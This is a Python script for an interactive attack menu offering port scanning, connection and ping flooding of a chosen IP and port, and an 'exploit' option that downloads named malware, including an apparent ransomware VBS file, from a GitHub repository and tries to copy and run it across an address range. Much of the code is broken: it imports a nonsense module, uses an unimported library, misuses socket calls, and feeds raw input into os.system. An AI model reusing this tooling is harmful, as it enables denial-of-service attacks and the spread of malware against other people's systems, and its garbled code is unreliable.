import os
import socket
import glglalghlaglallala
import subprocess
import urllib.request

defaultpath = os.path.abspath(__file__)

while True:  
    print("___________________________________________________________________")
    print("                            _    _                                 ")
    print("    /                       /  ,'                           /      ")
    print("---/-__----__----__---__---/_.'------__----__---__----__---/----__-")
    print("  /(     /   ) /   ) (_ ` /  \     /   ) /   ) (_ ` /   ) /   /___)")
    print("_/___\__(___(_(___/_(__)_/____\___(___/_/___/_(__)_(___/_/___(___ _")

    print("Connect to IP + Port: c")
    print("Sniff connections within a range: sniff")
    print("Sniff IP + Port status: pingsniff")
    print("Flood IP + Port with connections: flood")
    print("Flood IP + Port with pings: pingflood")
                                                                   
    x1 = input("Choose command: ")
    if x1 == "c":
        print("wowza")
        p65 = input("Select an IP: ")
        f34 = int(input("Select da port: "))

        try:
            socket.create_connection((p65, f34))
            print(str(p65) + ":" + str(f34) + " :3")
            print("exploit")
            print("getmeout")
            r43 = input("What now: ")
            if r43 == "exploit":
                print("how to exploit??")
                print("warning this will download some malwares if ur a fucking scrub maybe its not too safe to utilize some of these")
                xb = input("exploit: ")
                if xb == "infarox27":

                    print("based")
                    print("downloading infarox..")

                    url = "https://github.com/kaosSec/kaosTools/raw/main/infarox/infarox27/infarox27.EXE"
                    filename = defaultpath + "\\" + "infarox27.EXE"
                    urllib.request.urlretrieve(url, filename)

                    copied_file_path = os.path.join(defaultpath + "\\" + filename)
                    continue
                elif xb == "MSS":
                    
                    print("$$$$")
                    print("downloading MSS..")

                    url = "https://github.com/kaosSec/kaosTools/raw/main/py/MSS.py"
                    filename = defaultpath + "\\" + "MSS.py"
                    urllib.request.urlretrieve(url, filename)

                    copied_file_path = os.path.join(defaultpath + "\\" + filename)
                    continue
                elif xb == "PlorgBetterRansom":

                    print("thats rude")
                    print("downloading PlorgBetterRansom..")

                    url = "https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/PlorgBetterRansom.vbs"
                    filename = defaultpath + "\\" + "Plorg.vbs"
                    urllib.request.urlretrieve(url, filename)

                    copied_fule_path = os.path.join(defaultpath + "\\" + filename)
                    continue

                # pwn nubz
                for i in range(1, 256):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect(p65 + str(i))
                        shutil.copy2(filename, p65)
                        subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
                    except:
                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
                        pass
                
            elif r43 == "getmeout":
                exit
            else:
                print("what")
                exit
        except:
            print(str(p65) + " :/")

    elif x1 == "flood":
        stop = False
        while not stop:
            print("OWO")
            l34 = input("Select an IP: ")
            m21 = int(input("Select da port: "))
            if l34 == "99":
                stop = True
                break

            while True:
                try:
                    socket.create_connection(l34, m21)
                    print(str(l34) + str(m21) + " +1")
                except:
                    print(str(l34) + str(m21) + " +0")
                    break

    elif x1 == "pingflood":
        ports = []
        stop = False
        while not stop:
            print("X3")
            print("Options:")
            print("-r to specify range")
            j44 = input("Select an IP: ")
            if "-r" in j44:
                m77 = int(input("Select da port range: "))
                julie26 = list(map(int, m77.split()))
                ports.extend(julie26)
                if j44 == "99":
                    stop = True
                    break
                for port in ports:
                    print(port )
                    while True:
                        try:
                            os.system("ping " + j44 + " " + str(port))
                            print(str(j44) + str(port) + " +1")
                        except:
                            print(str(j44) + str(port) + " +0")
            else:
                p34 = int(input("Select da port: "))
                if j44 == "99":
                    stop = True
                    break

                while True:
                    try:
                        os.system("ping " + j44 + " " + str(p34))
                        print(str(j44) + str(p34) + " +1")
                    except:
                        print(str(j44) + str(p34) + " +0")
                        continue

    elif x1 == "sniff":
        print("yowza")
        ports = []
        stop = False
        while not stop:
            print("sniff....sniffsniff........")
            roko99 = input("Select an IP: ")
            pk56 = input("Select da port range: ")
            jodie34 = list(map(int, pk56.split()))
            ports.extend(jodie34)
            if roko99 == "99":
                stop = True
                break

            for port in ports:
                try:
                    socket.create_connection((roko99, port))
                    print(str(port) + " ^^")
                except:
                    print(str(port) + " @w@")

    elif x1 == "pingsniff":
        print("hehehe")
        print("sniff...snifssnsifffff.......")
        ports = []
        stop = False
        while not stop:
            jorn79 = input("Select an IP: ")
            jm23 = input("Select da port range: ")
            joyce80 = list(map(int, jm23.split()))
            ports.extend(joyce80)
            if jorn79 == "99":
                stop = True
                break

            for port in ports:
                try:
                    os.system("ping " + jorn79 + port)
                    print(str(port) + " ^^")
                except:
                    print(str(port) + " @w@")

                
    elif x1 == "3":
        print("bowza")
    elif x1 == "4":
        print("lowza")
    else:
        print("??")